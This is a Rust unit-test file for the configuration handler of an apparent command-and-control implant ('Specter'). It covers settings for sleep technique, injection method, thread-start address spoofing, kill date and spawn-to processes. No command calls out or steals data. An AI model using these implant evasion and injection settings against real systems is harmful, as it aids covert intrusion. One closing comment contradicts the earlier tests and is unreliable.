use std::collections::HashMap;

use red_cell_common::demon::{DemonCommand, DemonPackage};

use super::super::config::handle_config;
use super::super::{DispatchResult, MemFileStore, dispatch};
use crate::config::SpecterConfig;
use crate::download::DownloadTracker;
use crate::job::JobStore;
use crate::token::TokenVault;
use red_cell_common::demon::DemonConfigKey;

// ── CommandConfig tests ───────────────────────────────────────────────────

/// Build a config payload: `[key: u32 LE][extra…]`
fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
    let mut v = key.to_le_bytes().to_vec();
    v.extend_from_slice(extra);
    v
}

/// Parse a LE u32 from a response payload at the given byte offset.
fn resp_u32(payload: &[u8], byte_offset: usize) -> u32 {
    u32::from_le_bytes(payload[byte_offset..byte_offset + 4].try_into().unwrap())
}

/// Parse a LE u64 from a response payload at the given byte offset.
fn resp_u64(payload: &[u8], byte_offset: usize) -> u64 {
    u64::from_le_bytes(payload[byte_offset..byte_offset + 8].try_into().unwrap())
}

#[test]
fn config_empty_payload_ignored() {
    let mut config = SpecterConfig::default();
    let result = handle_config(&[], &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
}

#[test]
fn config_unknown_key_ignored() {
    let mut config = SpecterConfig::default();
    let payload = config_payload(9999, &[]);
    let result = handle_config(&payload, &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
}

#[test]
fn config_implant_verbose_sets_flag() {
    let mut config = SpecterConfig::default();
    assert!(!config.verbose);

    let extra = 1u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
    let result = handle_config(&payload, &mut config);

    assert!(config.verbose);
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
    assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantVerbose));
    assert_eq!(resp_u32(&resp.payload, 4), 1);
}

#[test]
fn config_implant_verbose_zero_clears_flag() {
    let mut config = SpecterConfig { verbose: true, ..Default::default() };

    let extra = 0u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
    handle_config(&payload, &mut config);
    assert!(!config.verbose);
}

#[test]
fn config_sleep_technique_updates() {
    let mut config = SpecterConfig::default();
    let extra = 3u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::ImplantSleepTechnique), &extra);
    let result = handle_config(&payload, &mut config);

    assert_eq!(config.sleep_technique, 3);
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSleepTechnique));
    assert_eq!(resp_u32(&resp.payload, 4), 3);
}

#[test]
fn config_coffee_threaded_updates() {
    let mut config = SpecterConfig::default();
    let extra = 1u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeThreaded), &extra);
    handle_config(&payload, &mut config);
    assert!(config.coffee_threaded);
}

#[test]
fn config_coffee_veh_updates() {
    let mut config = SpecterConfig::default();
    let extra = 1u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeVeh), &extra);
    handle_config(&payload, &mut config);
    assert!(config.coffee_veh);
}

#[test]
fn config_memory_alloc_updates() {
    let mut config = SpecterConfig::default();
    let extra = 42u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &extra);
    let result = handle_config(&payload, &mut config);

    assert_eq!(config.memory_alloc, 42);
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp_u32(&resp.payload, 4), 42);
}

#[test]
fn config_memory_execute_updates() {
    let mut config = SpecterConfig::default();
    let extra = 7u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::MemoryExecute), &extra);
    handle_config(&payload, &mut config);
    assert_eq!(config.memory_execute, 7);
}

#[test]
fn config_inject_technique_updates() {
    let mut config = SpecterConfig::default();
    let extra = 5u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::InjectTechnique), &extra);
    handle_config(&payload, &mut config);
    assert_eq!(config.inject_technique, 5);
}

#[test]
fn config_killdate_sets_timestamp() {
    let mut config = SpecterConfig::default();
    let ts: u64 = 1_700_000_000;
    let extra = ts.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
    let result = handle_config(&payload, &mut config);

    assert_eq!(config.kill_date, Some(ts as i64));
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::KillDate));
    assert_eq!(resp_u64(&resp.payload, 4), ts);
}

#[test]
fn config_killdate_zero_clears() {
    let mut config = SpecterConfig { kill_date: Some(123), ..Default::default() };
    let extra = 0u64.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
    handle_config(&payload, &mut config);
    assert_eq!(config.kill_date, None);
}

#[test]
fn config_killdate_missing_value_ignored() {
    let mut config = SpecterConfig::default();
    let payload = config_payload(u32::from(DemonConfigKey::KillDate), &[]);
    let result = handle_config(&payload, &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
}

#[test]
fn config_working_hours_updates() {
    let mut config = SpecterConfig::default();
    let extra = 0x00FF_FF00u32.to_le_bytes();
    let payload = config_payload(u32::from(DemonConfigKey::WorkingHours), &extra);
    handle_config(&payload, &mut config);
    assert_eq!(config.working_hours, Some(0x00FF_FF00u32 as i32));
}

#[test]
fn config_spf_thread_addr_updates() {
    let mut config = SpecterConfig::default();
    // Build: [key][lib_len][lib_bytes\0][func_len][func_bytes\0][offset]
    let lib = b"ntdll.dll\0";
    let func = b"RtlUserThreadStart\0";
    let mut extra = Vec::new();
    extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
    extra.extend_from_slice(lib);
    extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
    extra.extend_from_slice(func);
    extra.extend_from_slice(&0x10u32.to_le_bytes());
    let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
    let result = handle_config(&payload, &mut config);

    assert_eq!(
        config.spf_thread_addr,
        Some(("ntdll.dll".to_string(), "RtlUserThreadStart".to_string(), 0x10))
    );
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSpfThreadStart));
}

#[test]
fn config_inject_spoof_addr_updates() {
    let mut config = SpecterConfig::default();
    let lib = b"kernel32.dll\0";
    let func = b"CreateThread\0";
    let mut extra = Vec::new();
    extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
    extra.extend_from_slice(lib);
    extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
    extra.extend_from_slice(func);
    extra.extend_from_slice(&0x20u32.to_le_bytes());
    let payload = config_payload(u32::from(DemonConfigKey::InjectSpoofAddr), &extra);
    handle_config(&payload, &mut config);

    assert_eq!(
        config.inject_spoof_addr,
        Some(("kernel32.dll".to_string(), "CreateThread".to_string(), 0x20))
    );
}

#[test]
fn config_addr_missing_function_ignored() {
    let mut config = SpecterConfig::default();
    let lib = b"ntdll.dll\0";
    let mut extra = Vec::new();
    extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
    extra.extend_from_slice(lib);
    // No function or offset follows.
    let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
    let result = handle_config(&payload, &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
}

#[test]
fn config_spawn64_updates() {
    let mut config = SpecterConfig::default();
    // The server sends the path as length-prefixed UTF-16LE bytes.
    let path_str = "C:\\Windows\\System32\\notepad.exe";
    let utf16: Vec<u8> = path_str
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut extra = Vec::new();
    extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
    extra.extend_from_slice(&utf16);
    let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &extra);
    let result = handle_config(&payload, &mut config);

    assert_eq!(config.spawn64.as_deref(), Some(path_str));
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::InjectSpawn64));
}

#[test]
fn config_spawn32_updates() {
    let mut config = SpecterConfig::default();
    let path_str = "C:\\Windows\\SysWOW64\\cmd.exe";
    let utf16: Vec<u8> = path_str
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut extra = Vec::new();
    extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
    extra.extend_from_slice(&utf16);
    let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn32), &extra);
    handle_config(&payload, &mut config);

    assert_eq!(config.spawn32.as_deref(), Some(path_str));
}

#[test]
fn config_spawn_missing_bytes_ignored() {
    let mut config = SpecterConfig::default();
    let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &[]);
    let result = handle_config(&payload, &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
}

#[test]
fn config_u32_missing_value_ignored() {
    let mut config = SpecterConfig::default();
    // Key with no value bytes.
    let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &[]);
    let result = handle_config(&payload, &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
}

#[test]
fn config_dispatch_routes_correctly() {
    let extra = 1u32.to_le_bytes();
    let inner = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
    let pkg = DemonPackage {
        command_id: u32::from(DemonCommand::CommandConfig),
        request_id: 42,
        payload: inner,
    };
    let mut config = SpecterConfig::default();
    let mut vault = TokenVault::new();
    let mut downloads = DownloadTracker::default();
    let mut mem_files = MemFileStore::new();
    let result = dispatch(
        &pkg,
        &mut config,
        &mut vault,
        &mut downloads,
        &mut mem_files,
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );

    assert!(config.verbose);
    let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
}

#[test]
fn dispatch_routes_command_config() {
    let mut config = SpecterConfig::default();
    // Config key 0 (Sleep) + u32 value
    let mut payload = Vec::new();
    payload.extend_from_slice(&0u32.to_le_bytes()); // key = Sleep
    payload.extend_from_slice(&42u32.to_le_bytes()); // value
    let package = DemonPackage::new(DemonCommand::CommandConfig, 1, payload);
    let result = dispatch(
        &package,
        &mut config,
        &mut TokenVault::new(),
        &mut DownloadTracker::new(),
        &mut HashMap::new(),
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    // Config handler returns Ignore for most valid updates (no response ack).
    // Just verify it doesn't panic.
    let _ = result;
}
